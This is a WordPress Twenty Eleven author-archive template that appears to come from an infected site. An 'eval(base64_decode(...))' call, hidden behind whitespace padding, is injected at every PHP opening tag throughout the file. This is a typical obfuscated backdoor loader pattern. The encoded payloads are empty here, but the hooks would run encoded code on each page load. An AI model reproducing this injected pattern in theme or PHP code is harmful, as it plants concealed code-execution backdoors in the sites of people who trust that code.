<?php	 	eval(base64_decode(""));
/**
 * The template for displaying Author Archive pages.
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */

get_header(); ?>

		<section id="primary">
			<div id="content" role="main">

			<?php	 	eval(base64_decode("")); if ( have_posts() ) : ?>

				<?php	 	eval(base64_decode(""));
					/* Queue the first post, that way we know
					 * what author we're dealing with (if that is the case).
					 *
					 * We reset this later so we can run the loop
					 * properly with a call to rewind_posts().
					 */
					the_post();
				?>

				<header class="page-header">
					<h1 class="page-title author"><?php	 	eval(base64_decode("")); printf( __( 'Author Archives: %s', 'twentyeleven' ), '<span class="vcard"><a class="url fn n" href="' . esc_url( get_author_posts_url( get_the_author_meta( "ID" ) ) ) . '" title="' . esc_attr( get_the_author() ) . '" rel="me">' . get_the_author() . '</a></span>' ); ?></h1>
				</header>

				<?php	 	eval(base64_decode(""));
					/* Since we called the_post() above, we need to
					 * rewind the loop back to the beginning that way
					 * we can run the loop properly, in full.
					 */
					rewind_posts();
				?>

				<?php	 	eval(base64_decode("")); twentyeleven_content_nav( 'nav-above' ); ?>

				<?php	 	eval(base64_decode(""));
				// If a user has filled out their description, show a bio on their entries.
				if ( get_the_author_meta( 'description' ) ) : ?>
				<div id="author-info">
					<div id="author-avatar">
						<?php	 	eval(base64_decode("")); echo get_avatar( get_the_author_meta( 'user_email' ), apply_filters( 'twentyeleven_author_bio_avatar_size', 60 ) ); ?>
					</div><!-- #author-avatar -->
					<div id="author-description">
						<h2><?php	 	eval(base64_decode("")); printf( __( 'About %s', 'twentyeleven' ), get_the_author() ); ?></h2>
						<?php	 	eval(base64_decode("")); the_author_meta( 'description' ); ?>
					</div><!-- #author-description	-->
				</div><!-- #entry-author-info -->
				<?php	 	eval(base64_decode("")); endif; ?>

				<?php	 	eval(base64_decode("")); /* Start the Loop */ ?>
				<?php	 	eval(base64_decode("")); while ( have_posts() ) : the_post(); ?>

					<?php	 	eval(base64_decode(""));
						/* Include the Post-Format-specific template for the content.
						 * If you want to overload this in a child theme then include a file
						 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
						 */
						get_template_part( 'content', get_post_format() );
					?>

				<?php	 	eval(base64_decode("")); endwhile; ?>

				<?php	 	eval(base64_decode("")); twentyeleven_content_nav( 'nav-below' ); ?>

			<?php	 	eval(base64_decode("")); else : ?>

				<article id="post-0" class="post no-results not-found">
					<header class="entry-header">
						<h1 class="entry-title"><?php	 	eval(base64_decode("")); _e( 'Nothing Found', 'twentyeleven' ); ?></h1>
					</header><!-- .entry-header -->

					<div class="entry-content">
						<p><?php	 	eval(base64_decode("")); _e( 'Apologies, but no results were found for the requested archive. Perhaps searching will help find a related post.', 'twentyeleven' ); ?></p>
						<?php	 	eval(base64_decode("")); get_search_form(); ?>
					</div><!-- .entry-content -->
				</article><!-- #post-0 -->

			<?php	 	eval(base64_decode("")); endif; ?>

			</div><!-- #content -->
		</section><!-- #primary -->

<?php	 	eval(base64_decode("")); get_sidebar(); ?>
<?php	 	eval(base64_decode("")); get_footer(); ?>